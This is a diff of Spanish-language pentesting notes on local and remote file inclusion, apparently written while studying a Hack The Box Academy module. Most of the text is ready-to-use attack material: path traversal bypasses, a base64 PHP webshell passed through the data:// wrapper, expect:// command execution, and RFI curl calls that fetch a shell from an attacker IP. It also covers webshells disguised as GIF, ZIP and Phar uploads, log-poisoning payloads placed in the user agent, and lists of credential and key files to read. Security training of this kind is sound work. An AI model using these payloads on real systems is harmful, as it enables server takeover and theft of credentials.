@@ -1,6 +1,6 @@
 	#### FIle inclusion
 ### Definiciones
-Las paginas hoy en dia cuentan con referencia a los rrecursos mediante parametros. Estos parametros pueden no estar del todo codificado de forma segura generando que, en ciertos casos, un usuario pueda intentar que la pagina le muestre otro recurso distinto al pensado por los desarrolladores.
+Las paginas hoy en dia cuentan con referencia a los recursos mediante parametros. Estos parametros pueden no estar del todo codificado de forma segura generando que, en ciertos casos, un usuario pueda intentar que la pagina le muestre otro recurso distinto al pensado por los desarrolladores.
 
 	### Local File inclusion (LFI)
 LFI se refiere a la inclusion como recurso de archivos locales del sistema.
@@ -16,30 +16,22 @@ La mayor diferencia entre los lenguajes es la capcidad que tienen de leer o ejec
 ## Basic
 Linux - Windows: /etc/passwd - C:\Windows\boot.ini
 Cuando encontramos un parametro como el ejemplo de la seccion LFI (/index.php?page=about) o simimlares, es prudente probar buscar por ruta absoluta tanto el path de linux o windows segun corresponda.
-
 ../../../etc/passwd - C:\Windows\boot.ini
 #Esto puede darse mediante ruta absoluta (funcionaria si todo el input es utilizado para servir el recurso) o marcado la cantidad de directorios hacia atras que se debe ir (si el codigo setea para listar recursos de un  dir en particular>
-
 /../../../etc/passwd
 #La diferencia en este caso es la barra al comienzo. Muchas veces no solo se especifica el diretorio sino como comienza. Para ello podemos evitar que nos salte un error agregando una barra al comienzo.
 #De esta forma estariamos cortando ese control para ir al path que deseamos.
 
-
-				## -> !!! agregar Second Order Attack?
-
 	### Basic Bypasses
 ....//....//....//etc/passwd
 #Algunas aplicaciones estan preparadas para que al encontrar un ../ lo elimine. De esta forma encontraria ../, lo elimina pero el resultado es igualmente ../
-
 ..././..././..././etc/passwd
 ....\/....\/....\/etc/passwd
 ....////....////....////etc/passwd
 #Son algunas formas mas de bypasear. Todas siguen la misma logica que la primera ya sea escapar el slash, agregar mas barras o intercalar para que no sea correctamente detectado y aunque se elimine siga quedando nuestro path
-
 %2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
 #URL-encodear nuestro path es una buena alternativa ante casos donde no se permitan . o / puesto que no existirian puntos o barras en el input, sino directamente el path URL encodeado.
 #-> importante probar con un doble encodeo
-
 
 ##PHP anterior a 5.3/5.4
 En versiones anteriores a php solia haber un maximo de 4096 palabras, generando que lo que estaba despues sea eliminado.
@@ -63,18 +55,18 @@ Si encontramos un LFI podemos fuzzear parra encontrar archivos con status code q
 php://filter/read=convert.base64-encode/resource=config
 #En este ejemplo encontramos el archivo config.php el cual no se muestra en la pagina como un html.
 
+	### Source code disclosure
+Mediante el filter anterior seria posible poder verr el codigo fuente de la pagina (ej index) para asi ver si existe algun tipo de filtro
+
 	### Ejecucion de codigo remoto
 La ejecucion de codigo en PHP puede darse si esta habilitada la opcion de allow_url_include. Esto puede verse en el php.ini que se encuentra en la ruta /etc/php/Y.X/apache2/php.ini (Y.X se refiere a la version PHP)
 Nuevamente, si estamos frente a un LFI podemos usar el filter de la seccion anterior para poder obtener en base64 el contenido y luego decodearlo y leerlo.
 #Deberia aparecer -> allow_url_include = On
-
 Tambien es importantye buscar por expect. Este wrrapper es muy similar al primero a continuacion pero directamente con comandos. En este caso, expect debe instalarse de forma manual en el servidor
 #Deberia aparcer -> extension=expect
-
 data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2BCg%3D%3D&cmd=id
 #Este data wrapper attack puede ser posible gracias al allow url include. Con el payload de arriba tenemos una webshell.
 #Lo que esta en base 64 encodeado no es mas que una shell con php GET.
-
 expect://id
 #Este wrapper puede ser posible gracias al expect. Con el payload de arriba podemos ejecutar comandos directamente sin webshell
 
@@ -101,10 +93,8 @@ http://127.0.0.1:80/index.php
 ## Explotar RFI
 http://10.10.14.155/shell.php&cmd=id
 #Una vez verificado podemos explotarlo sirviendo una shell y consultandola mediante RFI
-
 curl -s "http://10.10.14.155/shell.php&cmd=id"
 #El comando del final puede ser remplazado por lo que querramos. En caso de ser uno largo es recomendable url encodearlo
-
 curl -s "ftp://10.10.14.155/shell.php&cmd=id"
 #En caso de que no se permita realizar mediante http se puede levantar un sevidor ftp con ftpdlib de python y correr el comando anterior
 
@@ -113,3 +103,96 @@ impacket-smbserver -smb2support share $(pwd)
 \\<OUR_IP>\share\shell.php&cmd=whoami
 #A diferencia de los casos anteriores, aca usamos la sintaxis de smb
 
+
+	### File uploads c/LFI
+https://academy.hackthebox.com/module/23/section/1493
+##Image
+echo 'GIF8<?php system($_GET["cmd"]); ?>' > shell.gif
+#Se crea websheel como si fuese GIF. En caso de que la app evalue la extension o el contenido GIF8 que debe tener dicho archivo, pasaria
+#En este caso luego queda buscar el lugar donde se guarda la imagen. Esto puede verse en el source code, en un cartel que nos aparezca o hasta viendo la source de donde saca la img si esta esta representada en la pagina
+
+##ZIP
+echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.jpg shell.php
+#Creo una shell.php que zipeo con el nombre shell.jpg
+zip://<ubicacion>/shell.zip#shell.php&cmd=id
+#Con el wrapper zip puedo especificar la ubicacion y con # el file de adentro del zip el cual uso
+
+##Phar
+<?php
+$phar = new Phar('shell.phar');
+$phar->startBuffering();
+$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
+$phar->setStub('<?php __HALT_COMPILER(); ?>');
+
+$phar->stopBuffering();
+#Este script puede ser compílado en un phar file. Primero se guarda en un archivo (ej. shell.php)
+#Cuando esto es llamado, escribe una webshell a un archivo llamado shell.txt
+php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
+#Creacion de phar file con el nombrer shell.jpg de la anterrior shell llamada shell.php
+phar://<ubicacion>/shell.jpg/shell.txt&cmd=id
+#Es muy similar a la tecnica con un zip. La diferencia es la sintaxis de como se llama a lo que esta almacenado dentro.
+
+	### Log poisioning
+##PHP Session ID poisioning
+La cookie de sesion es almacenada con todos los datos del usuario en dos path distintos dependiendo el OS:
+Linux: /var/lib/php/sessions/
+Windows: C:\Windows\Temp\
+El file donde se guarda es el nombre de la cookie pero con el prrefijo sess_: sess_<cookie>
+
+Si existe un LFI en la pagina se puede leer dicha file en /var/lib/php/sessions para asi ver si hay algo que controlamos. En el caso de que ese algo exista, seria posible inggresar una webshell para que se escriba en ese log.
+https://academy.hackthebox.com/module/23/section/252
+
+##Server log poisoning
+Apache a Nginx mantienen diferentes tipos de log como access.log y error.log
+Los access log suelen contener el user agent de la request que se haya realizado. Este user agent puede ser controlado por nosotros terminando en un log poisoning.
+Apache
+	Linux: /var/log/apache2/access.log
+	Windows: C:\xampp\apache\logs\access.log
+Nginx
+	Linux: /var/log/nginx/access.log
+	Windows: C:\nginx\log\access.log
+
+-> En nginx los log puede ser accedidos por usuarios de bajos prrivilegios como ww-data. Mientras que en versiones nuevas de apache solo root o adm puden acceder.
+
+Mozilla/5.0 <?php system($_GET['cmd']); ?> Safari/537.36
+#La idea de este ataque es modificar el user agent para que haya una webshell
+#Prestar especial atencion a los quotes. Deben ser simples
+
+##Otros logs
+/var/log/sshd.log
+/var/log/mail
+/var/log/vsftpd.log
+
+	### Automated scans
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u 'http://<SERVER_IP>:<PORT>/index.php?FUZZ=value'
+#Fuzzear parametros con un diccionario
+ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u "http://178.62.3.111:31923/index.php?language=FUZZ"
+#Una vez obtenido el parametro, se fuzzea con diccionarios LFI
+ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/default-web-root-directory-linux.txt:FUZZ -u "http://178.62.3.111:31923/index.php?language=../../../../../../FUZZ/index.php"
+#Fuzzear para saber el directorio en el que nos encontramos.
+#Hay lista para windows y linux
+
+Windows: https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Windows
+Linux: https://raw.githubusercontent.com/DragonJAR/Security-Wordlist/main/LFI-WordList-Linux
+#wget a estos links para tener listas con paths a buscar y fuzzear
+ffuf -w /usr/share/wordlists/SecLists/Fuzzing/LFI/LFI-WordList-Linux:FUZZ -u "http://178.62.3.111:31923/index.php?language=../../../../../../FUZZ"
+#Esto nos permite fuzzear y saber la ubicacion de los diferentes logs, config files, etc
+-> En el caso de apache se puede encontrar el path a log en diferentes lados:
+	- Importante leer /etc/apache2/apache2.conf en busqueda de CustomLog o ErrorLog (estos pueden estar apuntando a otro lado -> CustomLog ${APACHE_LOG_DIR}/access.log combined -> leer siguiente)
+	- Importante leer /etc/apachee2/envvars en busqueda de APACHE_LOG_DIR
+
+	### Mas archivos a consultar
+Una vez encontrada una vulnerabilidad LFI es importante intentar acceder a ciertos archivos.
+Como se especifica antes, es posibble listar archivos de configuracion y el source code de la pagina en busca de credenciales o paginas.
+Aun asi, se debe intentar buscar por:
+.ssh/id_rsa
+#Claves ssh
+/proc/net/tcp
+#Puertos abiertos internos
+/proc/net/tcp/fib_trie
+#Sirve para poder ver hosts si existiesen
+/proc/<dir numero>/cmdline
+#Cada proceso (pid) que existe en la ruta tiene un cmdline que puede contener informacion sensible de cuando el proceso fue ejecutado
+#Para saber dichos numeros se puede brutforcear con algun script
+/etc/apache2/site-enabled/00-default.conf
+#Archivo con posible informacion acerca del host donde pueden haber dominios, subdominios, etc.
